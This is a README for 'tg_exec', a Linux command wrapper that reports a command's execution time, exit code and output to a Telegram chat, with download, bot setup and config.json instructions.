# 🎉 tg_exec - Get Telegram Notifications for Your Commands

## 🚀 Getting Started

Welcome to `tg_exec`, a simple tool that sends you notifications in Telegram for Linux commands. With `tg_exec`, you can run any command and receive a report in your Telegram chat showing the execution time, exit code, and command output. This tool makes it easy to keep track of your command-line activities without being glued to the terminal.

## 📥 Download tg_exec

[![Download tg_exec](https://img.shields.io/badge/Download-tg_exec-brightgreen)](https://github.com/PajilayaMuchacha/tg_exec/releases)

To start using `tg_exec`, you need to download it from our Releases page. 

### 💻 System Requirements

- Operating System: Linux
- Compatible with any modern Linux distribution (Ubuntu, Fedora, etc.)
- Bash shell installed

## 🛠️ Installation

1. **Visit the Releases Page**  
   Go to the [Releases page](https://github.com/PajilayaMuchacha/tg_exec/releases).
   
2. **Download the Latest Version**  
   On the Releases page, find the latest version of `tg_exec`. Click the link to download the file.

3. **Set Up the File**  
   Once downloaded, navigate to the directory where the file is located using the terminal. Use the following command to make the file executable:
   ```
   chmod +x tg_exec
   ```

4. **Running tg_exec**  
   Now, you can run `tg_exec` from your terminal:
   ```
   ./tg_exec
   ```

## ⚙️ Configuration

Before you can use `tg_exec`, you'll need to set it up. Follow these steps for configuration:

1. **Create a Telegram Bot**  
   - Open Telegram and search for the "BotFather."
   - Start a chat and use the command `/newbot` to create a new bot.
   - Follow the prompts to name your bot and get your bot token.

2. **Get Your Chat ID**  
   - Start a chat with your bot by searching for its name in Telegram.
   - Send a message to the bot and then visit the following URL in your web browser to find your Chat ID:  
     `https://api.telegram.org/bot<YourBotToken>/getUpdates`
   - Look for the `"chat"` object in the JSON response and note your `chat_id`.

3. **Configure tg_exec**  
   Create a configuration file named `config.json` in the same directory as `tg_exec`. Fill it out like below:
   ```json
   {
     "bot_token": "<YourBotToken>",
     "chat_id": "<YourChatID>"
   }
   ```

## 📋 Usage

You can use `tg_exec` to run any command and receive updates directly in your Telegram chat.

### Example Command

To check the system's disk space, you would use:
```
./tg_exec df -h
```

After running this command, you'll receive a report in your Telegram chat containing:
- Execution time
- Exit code
- Output of the command

## ✨ Features

- Sends notifications to Telegram for any command executed.
- Shows execution time, exit code, and command output.
- Easy setup and lightweight, designed for quick installation on Linux.

## 🔎 Troubleshooting

If you encounter any issues while using `tg_exec`, here are some common problems and solutions:

1. **Bot Not Receiving Messages**  
   Ensure that your bot token and chat ID are correctly set in the `config.json` file.

2. **Permission Denied Error**  
   Check if you made the `tg_exec` file executable with `chmod +x tg_exec`.

3. **Command Not Sending Notifications**  
   Verify your internet connection and ensure that Telegram is reachable.

## 🔗 Helpful Links

- [GitHub Repository](https://github.com/PajilayaMuchacha/tg_exec)
- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)

## 📦 Download & Install

To use `tg_exec`, download it from our Releases page:

[![Download tg_exec](https://img.shields.io/badge/Download-tg_exec-brightgreen)](https://github.com/PajilayaMuchacha/tg_exec/releases)

Simply follow the installation steps above, and you'll soon receive Telegram notifications for your commands. Enjoy your enhanced command-line experience with `tg_exec`!